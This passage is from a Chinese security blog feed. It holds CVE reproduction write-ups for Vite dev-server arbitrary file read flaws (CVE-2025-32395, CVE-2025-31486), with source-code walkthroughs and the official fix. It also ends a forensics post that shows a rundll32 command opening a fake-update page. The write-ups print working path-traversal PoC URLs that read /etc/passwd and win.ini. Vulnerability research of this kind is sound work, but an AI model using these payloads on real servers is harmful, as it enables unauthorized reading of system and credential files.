woshiqizaowang.txt)&#x3D;1bdb83cfbdf29d8c2177cc7a6e75bae2 ）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 url.dll,[CAPSLOCK]f[CAPSLOCK]ile[CAPSLOCK]p[CAPSLOCK]rotocol[CAPSLOCK]h[CAPSLOCK]andler https;//fakeupdate.net/win10ue/bsod.html</span><br></pre></td></tr></table></figure><p>美化一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 url.dll,FileProtocolHandler https://fakeupdate.net/win10ue/bsod.html</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428103724566.png" alt="image-20250428103724566"></p>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite开发服务器任意文件读取漏洞分析复现(CVE-2025-32395)</title>
      <link href="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/"/>
      <url>/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/</url>
      
        <content type="html"><![CDATA[<p>第四个CVE了。。这是TGCTF的时候给我遇到的，再来复现！</p><p>我们先来看看影响版本：</p><blockquote><p>&gt;&#x3D;6.2.0, &lt;&#x3D;6.2.5</p><p>&gt;&#x3D;6.1.0, &lt;&#x3D;6.1.4</p><p>&gt;&#x3D;6.0.0, &lt;&#x3D;6.0.14</p><p>&gt;&#x3D;5.0.0, &lt;&#x3D;5.4.17</p><p>&lt;&#x3D;4.5.12</p></blockquote><p>前几天的6.2.6就是对这个CVE的修补。</p><p>我们先看看官方poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>也是一种目录穿越，但是跟CVE-2025-31486的又有不同之处。</p><p>commit如下：</p><p><a href="https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70">https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70</a></p><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250414135209030.png" class="" title="This is an example image"><p>我们可以看到这里新增了一个方法来检测<code>#</code>，从而防止CVE-2025-32395</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先搭建一下漏洞版本看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm create vite@latest</span><br><span class="line">cd vite-project/</span><br><span class="line">npm install vite@6.2.5</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250414140931338.png" class="" title="This is an example image"><p>这里我发现如何直接在页面url访问是获取不到的？那么接下来我们用yakit试试</p><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250414141112003.png" class="" title="This is an example image"><p>还有一种搭建方法，用webstorm</p><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250417124308498.png" class="" title="This is an example image"><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250417124316812.png" class="" title="This is an example image"><p>本次测试看看效果，当我们访问如下url时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:5173/@fs/Users</span><br></pre></td></tr></table></figure><p>页面回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">403 Restricted</span><br><span class="line">The request url &quot;C:/Users&quot; is outside of Vite serving allow list.</span><br><span class="line"></span><br><span class="line">- C:/Users/TY/Desktop/cve/vite浠绘剰鏂囦欢璇讳竴鍫哻ve/vite6.2.5-project</span><br><span class="line"></span><br><span class="line">Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.</span><br></pre></td></tr></table></figure><p>它说<code>C:/Users is outside of Vite serving allow list</code> ，那么下面给的<code>C:/Users/TY/Desktop/cve/vite浠绘剰鏂囦欢璇讳竴鍫哻ve/vite6.2.5-project</code>应该就是<code>allow list</code>，那么我们便可能通过目录穿越实现任意文件读取。</p><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250417125209196.png" class="" title="This is an example image"><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/@fs/Users/TY/Desktop/cve/vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E4%B8%80%E5%A0%86cve/vite6.2.5-project/#/../../../../../../../windows/win.ini</span><br></pre></td></tr></table></figure><p>我们跟一边poc！</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">viteServePublicMiddleware</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// To avoid the performance impact of `existsSync` on every request, we check against an</span></span><br><span class="line">  <span class="comment">// in-memory set of known public files. This set is updated on restarts.</span></span><br><span class="line">  <span class="comment">// also skip import request and internal requests `/@fs/ /@vite-client` etc...</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    (publicFiles &amp;&amp; !publicFiles.<span class="title function_">has</span>(<span class="title function_">toFilePath</span>(req.<span class="property">url</span>!))) ||</span><br><span class="line">    <span class="title function_">isImportRequest</span>(req.<span class="property">url</span>!) ||</span><br><span class="line">    <span class="title function_">isInternalRequest</span>(req.<span class="property">url</span>!) ||</span><br><span class="line">    <span class="comment">// for `/public-file.js?url` to be transformed</span></span><br><span class="line">    urlRE.<span class="title function_">test</span>(req.<span class="property">url</span>!)</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">serve</span>(req, res, next)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 <code>viteServePublicMiddleware</code> 函数开始看吧，这是一个处理请求的中间件函数，根据请求判断接下来的函数调用，满足第一个条件会进入 <code>next()</code> 也就是调用下一个中间件进行处理</p><p>然后就会进入下列函数，眼熟吧，前几个cve我们都分析过这。</p><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250417141050661.png" class="" title="This is an example image"><p>前面就是一些简单的判读处理，比如看是否是 GET 请求，是否以 <code>.map</code> 结尾等等，这里就不细看了。</p><p>后续会进入到下述if语句</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">headers</span>[<span class="string">&#x27;sec-fetch-dest&#x27;</span>] === <span class="string">&#x27;script&#x27;</span> ||</span><br><span class="line">        <span class="title function_">isJSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isImportRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isCSSRequest</span>(url) ||</span><br><span class="line">        <span class="title function_">isHTMLProxy</span>(url)</span><br><span class="line">      ) &#123;</span><br></pre></td></tr></table></figure><p>这里肯定都不满足会进入 else 分支直接调用下一个中间件函数处理 <code>viteServeRawFsMiddleware</code>，然后在这个中间件函数中接着调用了 <code>ensureServingAccess</code> 方法，该方法是处理 HTTP 请求的，如果文件不被允许访问，则返回 403，</p><img src="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/image-20250417141751949.png" class="" title="This is an example image"><p>然后我们关注一下下一个中间件函数处理 <code>viteServeRawFsMiddleware</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">viteServeRawFsMiddleware</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// In some cases (e.g. linked monorepos) files outside of root will</span></span><br><span class="line">  <span class="comment">// reference assets that are also out of served root. In such cases</span></span><br><span class="line">  <span class="comment">// the paths are rewritten to `/@fs/` prefixed paths and must be served by</span></span><br><span class="line">  <span class="comment">// searching based from fs root.</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">url</span>!.<span class="title function_">startsWith</span>(<span class="variable constant_">FS_PREFIX</span>)) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>!, <span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> pathname = <span class="built_in">decodeURI</span>(url.<span class="property">pathname</span>)</span><br><span class="line">    <span class="comment">// restrict files outside of `fs.allow`</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      !<span class="title function_">ensureServingAccess</span>(</span><br><span class="line">        <span class="title function_">slash</span>(path.<span class="title function_">resolve</span>(<span class="title function_">fsPathFromId</span>(pathname))),</span><br><span class="line">        server,</span><br><span class="line">        res,</span><br><span class="line">        next,</span><br><span class="line">      )</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> newPathname = pathname.<span class="title function_">slice</span>(<span class="variable constant_">FS_PREFIX</span>.<span class="property">length</span>)</span><br><span class="line">    <span class="keyword">if</span> (isWindows) newPathname = newPathname.<span class="title function_">replace</span>(<span class="regexp">/^[A-Z]:/i</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    url.<span class="property">pathname</span> = <span class="built_in">encodeURI</span>(newPathname)</span><br><span class="line">    req.<span class="property">url</span> = url.<span class="property">href</span>.<span class="title function_">slice</span>(url.<span class="property">origin</span>.<span class="property">length</span>)</span><br><span class="line">    <span class="title function_">serveFromRoot</span>(req, res, next)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本CVE就是绕过ensureServingAccess。但是在进入ensureServingAccess之前，我们发现上方存在两段代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>!, <span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> pathname = <span class="built_in">decodeURI</span>(url.<span class="property">pathname</span>)</span><br></pre></td></tr></table></figure><p>注意到这里的 new URL，其会把 <code>#</code> 后面的内容当作注释，从而返回的 url 只有 <code>/@fs/Users/TY/Desktop/cve/vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E4%B8%80%E5%A0%86cve/vite6.2.5-project/</code>，这其实就是我们的项目目录，也就是allowed file。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureServingAccess</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">res</span>: <span class="title class_">ServerResponse</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">next</span>: <span class="title class_">Connect</span>.<span class="title class_">NextFunction</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isFileServingAllowed</span>(url, server)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isFileReadable</span>(<span class="title function_">cleanUrl</span>(url))) &#123;</span><br><span class="line">    <span class="keyword">const</span> urlMessage = <span class="string">`The request url &quot;<span class="subst">$&#123;url&#125;</span>&quot; is outside of Vite serving allow list.`</span></span><br><span class="line">    <span class="keyword">const</span> hintMessage = <span class="string">`</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;server.config.server.fs.allow.map((i) =&gt; <span class="string">`- <span class="subst">$&#123;i&#125;</span>`</span>).join(<span class="string">&#x27;\n&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.`</span></span><br><span class="line"></span><br><span class="line">    server.<span class="property">config</span>.<span class="property">logger</span>.<span class="title function_">error</span>(urlMessage)</span><br><span class="line">    server.<span class="property">config</span>.<span class="property">logger</span>.<span class="title function_">warnOnce</span>(hintMessage + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    res.<span class="property">statusCode</span> = <span class="number">403</span></span><br><span class="line">    res.<span class="title function_">write</span>(<span class="title function_">renderRestrictedErrorHTML</span>(urlMessage + <span class="string">&#x27;\n&#x27;</span> + hintMessage))</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// if the file doesn&#x27;t exist, we shouldn&#x27;t restrict this path as it can</span></span><br><span class="line">    <span class="comment">// be an API call. Middlewares would issue a 404 if the file isn&#x27;t handled</span></span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处会先调用isFileServingAllowed，判断url是否允许被vite服务器访问。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileServingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileServingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">configOrUrl</span>: <span class="title class_">ResolvedConfig</span> | <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">urlOrServer</span>: <span class="built_in">string</span> | <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> config = (</span><br><span class="line">    <span class="keyword">typeof</span> urlOrServer === <span class="string">&#x27;string&#x27;</span> ? configOrUrl : urlOrServer.<span class="property">config</span></span><br><span class="line">  ) <span class="keyword">as</span> <span class="title class_">ResolvedConfig</span></span><br><span class="line">  <span class="keyword">const</span> url = (</span><br><span class="line">    <span class="keyword">typeof</span> urlOrServer === <span class="string">&#x27;string&#x27;</span> ? urlOrServer : configOrUrl</span><br><span class="line">  ) <span class="keyword">as</span> <span class="built_in">string</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!config.<span class="property">server</span>.<span class="property">fs</span>.<span class="property">strict</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  <span class="keyword">const</span> filePath = <span class="title function_">fsPathFromUrl</span>(url)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">isFileLoadingAllowed</span>(config, filePath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其执行了 <code>isFileLoadingAllowed</code> 函数检查文件路径是否符合 Vite 的文件访问规则。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isFileLoadingAllowed</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">config</span>: <span class="title class_">ResolvedConfig</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">filePath</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; fs &#125; = config.<span class="property">server</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="property">strict</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="title function_">fsDenyGlob</span>(filePath)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (config.<span class="property">safeModulePaths</span>.<span class="title function_">has</span>(filePath)) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.<span class="property">allow</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">uri</span>) =&gt;</span> <span class="title function_">isUriInFilePath</span>(uri, filePath))) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在几个条件判断，只有返回 true 才能允许访问，比如看最后一个判断</p><p>我们跟进一下allow，此处应该就是允许的目录</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow</span>?: <span class="built_in">string</span>[]</span><br></pre></td></tr></table></figure><p>再次跟进。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">server</span>: <span class="title class_">ResolvedServerOptions</span> = &#123;</span><br><span class="line">  ..._server,</span><br><span class="line">  <span class="attr">fs</span>: &#123;</span><br><span class="line">    ..._server.<span class="property">fs</span>,</span><br><span class="line">    <span class="comment">// run searchForWorkspaceRoot only if needed</span></span><br><span class="line">    <span class="attr">allow</span>: raw?.<span class="property">fs</span>?.<span class="property">allow</span> ?? [<span class="title function_">searchForWorkspaceRoot</span>(root)],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">sourcemapIgnoreList</span>:</span><br><span class="line">    _server.<span class="property">sourcemapIgnoreList</span> === <span class="literal">false</span></span><br><span class="line">      ? <span class="function">() =&gt;</span> <span class="literal">false</span></span><br><span class="line">      : _server.<span class="property">sourcemapIgnoreList</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>searchForWorkspaceRoot</code>，看英文就是查询工作空间根目录，应该就是网站目录！</p><p>那么使用我们上述的poc，此处就会返回true！</p><p>最后绕过 <code>ensureServingAccess</code> 方法，同样也返回 true，</p><p>目录验证后，后续的处理逻辑却又是使用我们原始的url进行处理，最后像正常读取 <code>/@fs/</code> 允许目录下的文件一样进行读取，通过目录穿越访问到任意文件</p><h2 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h2><p>我们直接看官方commit</p><p><a href="https://github.com/vitejs/vite/commit/3bb0883d22d59cfd901ff18f338e8b4bf11395f7">https://github.com/vitejs/vite/commit/3bb0883d22d59cfd901ff18f338e8b4bf11395f7</a></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.<span class="property">url</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;#&#x27;</span>)) &#123;</span><br><span class="line">  <span class="comment">// HTTP 1.1 spec recommends sending 400 Bad Request</span></span><br><span class="line">  <span class="comment">// (https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4)</span></span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">400</span>)</span><br><span class="line">  res.<span class="title function_">end</span>()</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不允许url中包含<code>#</code>，否则直接报错400.</p>]]></content>
      
      
      <categories>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite开发服务器任意文件读取漏洞分析复现(CVE-2025-31486)</title>
      <link href="/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/"/>
      <url>/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/</url>
      
        <content type="html"><![CDATA[<p>其实上文（CVE-2025-31125）中所说的未公开POC是此处31486的一种。</p><p><code>svg</code>这种是可以打CVE-2025-31486的。在上一篇CVE的复现中我已经提到了，这里就不说了。</p><p>6.2.5修补了上述漏洞。</p><p>但是这里还有一种方法：</p><h2 id="bypass-ensureServingAccess权限校验"><a href="#bypass-ensureServingAccess权限校验" class="headerlink" title="bypass ensureServingAccess权限校验"></a>bypass ensureServingAccess权限校验</h2><p>这里先给出poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&amp;?raw</span><br><span class="line"></span><br><span class="line">http://localhost:5173/iife/@fs/C:/Users/swordlight/main/sec/analyse/vite-6.2.4/?/../../../../../../../windows/win.ini?import&amp;raw</span><br></pre></td></tr></table></figure><p>在修复CVE-2024-45811时有引入ensureServingAccess对传入的url进行校验，这个poc就绕过了<code>ensureServingAccess</code>的校验从而使用raw语法成功读取到了文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5173/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd?import&amp;?raw</span><br></pre></td></tr></table></figure><img src="/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/image-20250410181444770.png" class="" title="This is an example image"><p>接下来我们看看流程！跟进一下<code>ensureServingAccesss</code>，只要<code>ensureServingAccess</code>为true即可绕过！</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureServingAccess</span>(<span class="params"></span></span><br><span 